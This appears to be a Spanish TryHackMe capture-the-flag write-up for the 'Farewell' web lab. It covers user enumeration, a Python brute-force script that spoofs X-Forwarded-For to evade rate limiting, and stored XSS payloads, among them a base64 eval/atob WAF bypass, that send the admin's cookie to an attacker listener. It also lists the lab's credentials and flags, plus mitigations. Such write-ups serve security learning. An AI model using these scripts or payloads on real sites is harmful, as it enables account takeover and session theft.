---
title: "Farewell"
platform: "TryHackMe"
os: "Linux"
difficulty: "Medium"
ip: "10.67.149.164"
slug: "farewell"
author: "Z4k7"
date: "2026-03-21"
year: "2026"
status: "pwned"
tags:
  - "Cookie"
  - "WAF"
  - "BruteForce"
  - "XForwardedFor"
  - "LimitingBypass"
  - "Bypass"
  - "eval"
  - "redteam"
  - "UserEnumeration"
  - "InformationDisclosure"
techniques:
  - "User Enumeration via JSON Response"
  - "Brute Force Script Python WAF Bypass"
  - "WAF Bypass X-Forwarded-For"
  - "XSS almacenado"
  - "WAF Bypass XSS Base64 eval"
tools:
  - "Nmap"
  - "ffuf"
  - "Burp Suite"
  - "Python HTTP Server"
flags_list:
  - label: "Usuario"
    value: "deliver11"
  - label: "Password"
    value: "Tokyo1010"
  - label: "Flag"
    value: "THM{USER_ACCESS_1010}"
  - label: "Flag"
    value: "THM{ADMINP@wned007}"
summary: "Lab de TryHackMe categoría RedTeam. Aplicación web PHP sobre Apache 2.4.58 / Ubuntu. Cadena de ataque: User enumeration via respuesta JSON del login que filtra password_hint → usuarios visibles en HTML del banner → brute force con bypass de rate limiting WAF via header X-Forwarded-For rotando IPs (script Python propio) → credenciales deliver11:Tokyo1010 → acceso inicial → XSS Almacenada con WAF bypass usando body onload + eval(atob(...)) en base64 → robo de cookie de administrador → acceso a admin.php → 2 flags obtenidas.  ---"
steps:

  - id: "recon_1"
    num: "01"
    title: "Reconocimiento"
    content:
      - kind: "note"
        text: |
          Validamos si contamos con conexión a la ip por medio de un `ping`
      - kind: "code"
        lang: "BASH"
        code: |
          ping -c 6 farewell.thm
          PING farewell.thm (10.67.149.164) 56(84) bytes of data.
          64 bytes from farewell.thm (10.67.149.164): icmp_seq=1 ttl=62 time=74.3 ms
          64 bytes from farewell.thm (10.67.149.164): icmp_seq=2 ttl=62 time=74.8 ms
          64 bytes from farewell.thm (10.67.149.164): icmp_seq=3 ttl=62 time=73.8 ms
          64 bytes from farewell.thm (10.67.149.164): icmp_seq=4 ttl=62 time=88.8 ms
          64 bytes from farewell.thm (10.67.149.164): icmp_seq=5 ttl=62 time=74.5 ms
          64 bytes from farewell.thm (10.67.149.164): icmp_seq=6 ttl=62 time=74.3 ms
      - kind: "note"
        text: |
          Validamos la interfaz de usuario para consultar el entorno.
      - kind: "image"
        src: "assets/images/Farewell/file-20260321154526716.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Contamos con un panel de login. En la parte superior hay un banner con actividad reciente de usuarios — información relevante de reconocimiento.
          Iniciamos con un escaneo completo de puertos:
      - kind: "code"
        lang: "BASH"
        code: |
          nmap -sVC -O -T4 -v farewell.thm
          
          PORT   STATE SERVICE VERSION
          22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
          80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
          | http-cookie-flags:
          |   /:
          |     PHPSESSID:
          |_      httponly flag not set
          |_http-title: Farewell — Login
      - kind: "bullet"
        text: "Puerto 22 → OpenSSH 9.6p1 Ubuntu"
      - kind: "bullet"
        text: "Puerto 80 → Apache httpd 2.4.58 — httponly flag not set en PHPSESSID"
      - kind: "note"
        text: |
          Validando en la consola del navegador confirmamos que `HttpOnly` está en estado falso — potencial vector XSS para robo de cookie.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Tercer lab consecutivo con `httponly flag not set` detectado desde nmap — ya deberías tener esto como reflejo automático: nmap → revisar cookie flags → si no tiene HttpOnly → XSS para robo de sesión es el vector prioritario. El TTL 62 confirma 2 saltos via VPN de THM, consistente con los labs anteriores. Esta vez el dominio `farewell.thm` ya estaba en `/etc/hosts` antes del ping — buen hábito haberlo configurado desde el inicio."

  - id: "enum_1"
    num: "02"
    title: "Enumeración"
    content:
      - kind: "note"
        text: |
          Consultamos `robots.txt`:
      - kind: "image"
        src: "assets/images/Farewell/file-20260321155458738.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          No disponible — posible protección o configuración intencional.
          Fuzzing de directorios sin User-Agent:
      - kind: "code"
        lang: "BASH"
        code: |
          ffuf -u http://farewell.thm/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt:FUZZ -v | grep "| URL |"
          
          | URL | http://farewell.thm/javascript
          | URL | http://farewell.thm/server-status
      - kind: "note"
        text: |
          WAF bloqueando acceso a los directorios encontrados. Probamos con User-Agent de navegador para evadir filtro:
      - kind: "code"
        lang: "BASH"
        code: |
          ffuf -u http://farewell.thm/FUZZ -c -w /usr/share/dirb/wordlists/common.txt -v -H "User-Agent: Mozilla/5.0" | grep "| URL |"
          
          | URL | http://farewell.thm/.htaccess
          | URL | http://farewell.thm/.hta
          | URL | http://farewell.thm/.htpasswd
          | URL | http://farewell.thm/admin.php
          | URL | http://farewell.thm/index.php
          | URL | http://farewell.thm/info.php
          | URL | http://farewell.thm/javascript
      - kind: "note"
        text: |
          Hallazgo clave: `admin.php` visible solo con User-Agent de navegador.
      - kind: "image"
        src: "assets/images/Farewell/file-20260321161721719.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          `admin.php` requiere autenticación — no podemos acceder directamente.
      - kind: "callout"
        type: "warning"
        label: "WAF filtrando por User-Agent"
        text: "El WAF ocultaba directorios a herramientas de fuzzing pero los revelaba a User-Agents de navegadores reales. Siempre probar fuzzing con `-H 'User-Agent: Mozilla/5.0'` cuando el primer scan devuelve resultados escasos. `admin.php` es el objetivo final de este lab."
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "El WAF aquí filtraba por User-Agent — técnica de defensa superficial pero común. Lo importante: encontraste `admin.php` en la segunda pasada. En un engagement real, también vale probar `X-Forwarded-For`, `X-Real-IP`, y `Referer` manipulados para bypass de WAF basado en headers, que es exactamente lo que usaste en la fase de brute force."

  - id: "enum"
    num: "03"
    title: "Fase 1 — User Enumeration via JSON Response"
    content:
      - kind: "note"
        text: |
          Intentamos login con usuario `admin` — el servidor responde diferente según si el usuario existe:
      - kind: "image"
        src: "assets/images/Farewell/file-20260321162040880.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Analizando `check.js` — la lógica client-side confirma el comportamiento:
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          if (data && data.error === 'auth_failed') {
              if (data.user && data.user.password_hint) {
                  showHint("Invalid password against the user");
              } else {
                  showAlert('Invalid username or password.');
              }
          }
      - kind: "note"
        text: |
          El servidor filtra `password_hint` en la respuesta JSON cuando el usuario existe. Capturando con Burp Suite:
      - kind: "image"
        src: "assets/images/Farewell/file-20260321162836390.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Password hint de admin: `"the year plus a kind send-off"`
          Usuarios visibles en el banner HTML del sitio:
      - kind: "code"
        lang: "HTML"
        code: |
          <div class="tick-item">adam posted a message - 3 hrs ago</div>
          <div class="tick-item">deliver11 posted a message - 4 hrs ago</div>
          <div class="tick-item">nora posted a message - 1 day ago</div>
      - kind: "note"
        text: |
          Respuestas JSON para cada usuario:
      - kind: "code"
        lang: "JSON"
        code: |
          // adam
          {"error":"auth_failed","user":{"name":"adam","password_hint":"favorite pet + 2"}}
          
          // deliver11
          {"error":"auth_failed","user":{"name":"deliver11","password_hint":"Capital of Japan followed by 4 digits"}}
          
          // nora
          {"error":"auth_failed","user":{"name":"nora","password_hint":"lucky number 789"}}
      - kind: "note"
        text: |
          El más explotable: deliver11 → `Tokyo + 4 dígitos` → espacio de búsqueda de solo 10,000 combinaciones.
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Esta es una vulnerabilidad de User Enumeration + Information Disclosure combinadas en un solo endpoint. El servidor nunca debería revelar si un usuario existe o no — la respuesta debe ser idéntica para usuarios válidos e inválidos. Y el `password_hint` expuesto en la respuesta JSON es Information Disclosure crítico: le dice al atacante exactamente cómo construir el ataque de brute force. El hint de deliver11 redujo el espacio de búsqueda de miles de millones a exactamente 10,000 combinaciones."

  - id: "privesc_1"
    num: "04"
    title: "Fase 2 — Brute Force con WAF Bypass via X-Forwarded-For"
    content:
      - kind: "note"
        text: |
          Después de 10 intentos el WAF bloquea la IP:
      - kind: "image"
        src: "assets/images/Farewell/file-20260321164210617.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Bypass via header `X-Forwarded-For` con IP diferente:
      - kind: "image"
        src: "assets/images/Farewell/file-20260321164356106.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Script Python propio para automatizar brute force + bypass:
      - kind: "code"
        lang: "PYTHON"
        code: |
          #!/usr/bin/python3
          
          import requests
          
          url = input('[*] Ingrese la url: ')
          try:
              response = requests.get(f'http://{url}/')
          
              if response.status_code == 200:
                  print("[+] Conexión exitosa")
                  print(f"_____________________")
                  headers = {
                      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
                  }
                  username = input('[*] Ingrese el posible usuario: ')
                  passwor = input('[*] Ingrese el posible password: ')
                  password_list = [str(i).zfill(4) for i in range(10000)]
                  ip = [str(i).zfill(3) for i in range(243)]
                  ip_index = 0
          
                  for password in password_list:
                      data = {"username": username, "password": passwor+password}
                      res = requests.post(f'http://{url}/auth.php', data=data, headers=headers)
          
                      if res.status_code == 200:
                          resjson = res.json()
                          if resjson.get('success'):
                              print(f"[+] Usuario: {username}")
                              print(f"[+] Password: {passwor+password}")
                              break
                          elif resjson.get('error') == "auth_failed":
                              print(f"[+] Conexion: {res.status_code}")
                              print(f"[+] Usuario: {username}")
                              print(f"[+] Password: {passwor+password}")
                          else:
                              print(f"[+] Usuario: {username}")
                              print(f"[+] Password: {passwor+password}")
                              break
                      else:
                          print(f"[+] Saltó el WAF")
                          print(f"[+] Solicitamos cambio de ip para evitar el WAF")
                          while ip_index < len(ip):
                              cambioip = ip[ip_index]
                              headers = {
                                  "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                  "X-Forwarded-For": f"192.168.1.{cambioip}"
                              }
                              res = requests.post(f'http://{url}/auth.php', data=data, headers=headers)
                              if res.status_code == 200:
                                  print(f"[+] Conexión exitosa con cambio de IP")
                                  ip_index += 1
                                  resjson = res.json()
                                  if resjson.get('success'):
                                      print(f"[+] Usuario: {username}")
                                      print(f"[+] Password: {passwor+password}")
                                      exit()
                                  elif resjson.get('error') == "auth_failed":
                                      break
                                  else:
                                      ip_index += 1
              else:
                  print(f"[-] Error con la conexión. Código: {response.status_code}")
          
          except requests.exceptions.RequestException as e:
              print(f"[-] Error al realizar la petición: {e}")
      - kind: "note"
        text: |
          Ejecución del script:
      - kind: "code"
        lang: "BASH"
        code: |
          python3 scriptfarewell.py
          [*] Ingrese la url: farewell.thm
          [+] Conexión exitosa
          [*] Ingrese el posible usuario: deliver11
          [*] Ingrese el posible password: Tokyo
          ...
          [+] Usuario: deliver11
          [+] Password: Tokyo1010        <------ PASSWORD

  - id: "flag_01"
    type: "flag"
    flag_items:
      - label: "Usuario"
        value: "deliver11"
      - label: "Password"
        value: "Tokyo1010"

  - id: "flag_01_post"
    num: ""
    title: "Post Flag"
    content:
      - kind: "note"
        text: |
          Acceso confirmado:
      - kind: "image"
        src: "assets/images/Farewell/file-20260321170618182.jpg"
        caption: "Evidencia técnica"

  - id: "flag_02"
    type: "flag"
    flag_items:
      - label: "Flag"
        value: "THM{USER_ACCESS_1010}"

  - id: "privesc"
    num: "05"
    title: "Fase 3 — XSS Almacenada + WAF Bypass eval/atob → Cookie Admin"
    content:
      - kind: "note"
        text: |
          La aplicación tiene un campo para dejar mensajes — revisado por un admin. Payload directo bloqueado por WAF:
      - kind: "image"
        src: "assets/images/Farewell/file-20260321171748670.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          El campo acepta `body onload`. Servidor en escucha:
      - kind: "code"
        lang: "BASH"
        code: |
          python3 -m http.server 8989
      - kind: "note"
        text: |
          Intentos de bypass progresivos:
      - kind: "code"
        lang: "JAVASCRIPT"
        code: |
          // Intento 1 — append script (bloqueado por longitud)
          <body onload="var a=document.createElement('script');a.src='http://192.168.188.159:8989';document.body.appendChild(a)">
          
          // Intento 2 — new Image (más corto)
          <body onload="new Image().src='http://192.168.188.159:8989?x='+document['coo'+'kie']">
          
          // Intento 3 — eval + atob base64 (exitoso)
          <body onload="eval(atob('ZmV0Y2goJy8vMTkyLjE2OC4xODguMTU5Ojg5ODkvJytkb2N1bWVudC5jb29raWUp'))">
      - kind: "note"
        text: |
          Cookie del administrador capturada:
      - kind: "image"
        src: "assets/images/Farewell/file-20260321210701247.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Cookie inyectada en el navegador:
      - kind: "image"
        src: "assets/images/Farewell/file-20260321211002835.jpg"
        caption: "Evidencia técnica"
      - kind: "note"
        text: |
          Acceso a `admin.php` con la cookie del administrador:
      - kind: "image"
        src: "assets/images/Farewell/file-20260321211149686.jpg"
        caption: "Evidencia técnica"
      - kind: "callout"
        type: "tip"
        label: "Agente"
        text: "Tres técnicas de bypass intentadas en orden de complejidad creciente — eso es metodología correcta. El bypass con `eval(atob(...))` funciona porque el WAF busca palabras clave en texto plano (`fetch`, `document.cookie`) pero no decodifica base64 antes de aplicar las reglas — otra discrepancia de parsing, el mismo principio que HTML entities en Padelify. La cadena en base64 decodifica a: `fetch('//192.168.188.159:8989/'+document.cookie)`. Para labs futuros: cuando `eval(atob(...))` funciona, también vale probar `Function(atob(...))()` y `setTimeout(atob(...))` como alternativas si eval está bloqueado."

  - id: "flag_03"
    type: "flag"
    flag_items:
      - label: "Flag"
        value: "THM{ADMINP@wned007}"

lessons:
  - 'Las respuestas JSON del servidor nunca deben diferenciar entre usuario inexistente y password incorrecto — ambas deben ser idénticas para evitar user enumeration'
  - 'Los `password_hint` expuestos en respuestas de API reducen drásticamente el espacio de brute force'
  - 'El header `X-Forwarded-For` permite bypassear rate limiting basado en IP cuando el servidor confía ciegamente en ese header'
  - 'Los WAFs basados en User-Agent son evasión trivial — cambiar el User-Agent a uno de navegador real'
  - '`eval(atob(...))` bypasea WAFs que no decodifican base64 antes de aplicar reglas'
  - 'Siempre intentar múltiples técnicas de bypass XSS en orden de complejidad creciente'
mitigation:
  - 'Respuesta genérica en login: devolver siempre el mismo mensaje independientemente de si el usuario existe o no'
  - 'Eliminar password_hint de respuestas API — nunca exponer hints en responses JSON del lado del servidor'
  - 'Rate limiting basado en sesión/usuario, no solo en IP — `X-Forwarded-For` no debe ser fuente de IP de confianza sin validación'
  - 'WAF con decodificación previa: normalizar base64, HTML entities, URL encoding antes de aplicar reglas'
  - 'HttpOnly en cookies de sesión — siempre, sin excepción'
  - 'Validar y sanitizar input server-side en campos de mensajes — no confiar en filtros client-side'
---
